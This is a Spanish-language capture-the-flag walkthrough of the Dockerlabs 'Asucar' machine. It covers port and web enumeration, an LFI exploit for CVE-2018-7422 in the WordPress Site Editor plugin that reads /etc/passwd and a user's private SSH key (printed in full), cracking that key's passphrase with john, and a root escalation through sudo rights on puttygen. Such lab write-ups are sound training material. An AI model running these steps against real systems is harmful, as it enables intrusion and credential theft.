#Asucar - Dockerlabs
Web: https://dockerlabs.es

Reconocimiento

Escaneo de puertos

```
nmap -p- --open -sS -sC -sV --min-rate 2500 -n -vvv -Pn 172.17.0.2 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 18:13 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Initiating ARP Ping Scan at 18:13
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:13, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:13
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:13, 0.59s elapsed (65535 total ports)
Initiating Service scan at 18:13
Scanning 2 services on 172.17.0.2
Completed Service scan at 18:13, 6.65s elapsed (2 services on 1 host)
NSE: Script scanning 172.17.0.2.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 1.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.11s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-10-30 18:13:11 EDT for 9s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 64:44:10:ff:fe:17:28:06:93:11:e4:55:ea:93:3b:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK2mR4ZHERhhZkS6oA/37T+5m7Kv7i6Bzxx5P62opMNRmFStGK9uXi0hybtfyK6LhU0llQjBm2Yok45ExbRDP78=
|   256 2d:aa:fb:08:58:aa:34:8d:4f:8a:71:b9:e4:b5:99:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDl/MgMW7LMnrd5ESXJMi5ReeYP9/NJEFB/UkyYaWUVu
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Asucar Moreno
|_http-server-header: Apache/2.4.59 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 6.5.3
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Analizamos como está hecho el sitio web con la herramienta **whatweb**

```
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.5.3], Script[importmap,module], Title[Asucar Moreno], UncommonHeaders[link], WordPress[6.5.3]
```

Identificamos que estamos frente a un sitio web hecho en WordPress 6.5.3
![Captura de pantalla 2024-10-30 185642](https://github.com/user-attachments/assets/58a3e4a5-23ab-408d-896d-4157cbd80c67)

Procedemos a realizar un reconocimiento con la herramienta **gobuster** para encontrar subdominios e información

```
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://asucar.dl -x php,html,txt,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://asucar.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 274]
/.html                (Status: 403) [Size: 274]
/index.php            (Status: 301) [Size: 0] [--> http://asucar.dl/]
/wp-content           (Status: 301) [Size: 311] [--> http://asucar.dl/wp-content/]
/wordpress            (Status: 301) [Size: 310] [--> http://asucar.dl/wordpress/]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 312] [--> http://asucar.dl/wp-includes/]
/readme.html          (Status: 200) [Size: 7401]
/wp-login.php         (Status: 200) [Size: 7464]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 309] [--> http://asucar.dl/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/.php                 (Status: 403) [Size: 274]
/.html                (Status: 403) [Size: 274]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://asucar.dl/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 274]
```

Tenemos directorios interesantes, como el **/wp-login.php** 

![Captura de pantalla 2024-10-30 192235](https://github.com/user-attachments/assets/cceb68d9-e585-4594-802f-b0c08a721476)

Para obtener credenciales usamos la herramienta **wpscan** para identificar posibles usuarios, versiones de plugins o vulnerabilidades.

```
[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
```

Encontramos un plugin con una versión vulnerable a un LFI  *CVE-2018-7422*

-------------------------------------------------------------------------------------------------------
Explotación 🔥
-------------------------------------------------------------------------------------------------------

El exploit que necesitamos lo podemos encontrar en este repositorio 👉 https://github.com/jessisec/CVE-2018-7422

Siguiendo los pasos de las instrucciones, tendremos la información del archivo **/etc/passwd**

```
python3 CVE-2018-7422.py -u http://asucar.dl -i
site-editor-lfi $> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
curiosito:x:1000:1000::/home/curiosito:/bin/bash
{"success":true,"data":{"output":[]}}
```

Encontramos el usuario **curiosito**. De la misma forma obtenemos su id_rsa para tener acceso a la maquina mediante SSH

```
site-editor-lfi $> /home/curiosito/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
cr4PSHHcOqKAkv1/9xYpXW2ug=
-----END OPENSSH PRIVATE KEY-----
{"success":true,"data":{"output":[]}}
```

Intentamos acceder pero nos pide una contraseña

```
ssh -i id_rsa  curiosito@172.17.0.2                  
Enter passphrase for key 'id_rsa': 
```

Por lo que procedemos a descifrar el hash con la herramienta *john*
`ssh2john id_rsa > hash`

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:03:40 DONE (2024-10-30 19:49) 0.004543g/s 16.13p/s 16.13c/s 16.13C/s indiana..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La contraseña es honda1

-------------------------------------------------------------------------------------------------------
Escalada de privilegios
-------------------------------------------------------------------------------------------------------

Una vez dentro ejecutamos el comando *sudo -l* y nos indica que podemos ejecutar /usr/bin/puttygen como root

![Captura de pantalla 2024-10-30 212906](https://github.com/user-attachments/assets/3e68e31a-5ace-430f-b783-cb7f4b8190e9)

Crearemos un par de claves SSH en formato OpenSSH en /root/.ssh/

```
curiosito@a20e56878e31:/tmp$ puttygen -t rsa -o id_rsa -O private-openssh
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++
Enter passphrase to save key: 
Re-enter passphrase to verify: 
curiosito@a20e56878e31:/tmp$ sudo -u root /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
curiosito@a20e56878e31:/tmp$ 
```

Aprovechamos el privilegio y nos convertimos en root

![Captura de pantalla 2024-10-30 213800](https://github.com/user-attachments/assets/4b564d1c-1f26-4f42-8132-aafd6e09e8cc)

Somos usuario root!! 🥳
Maquina completada ✅
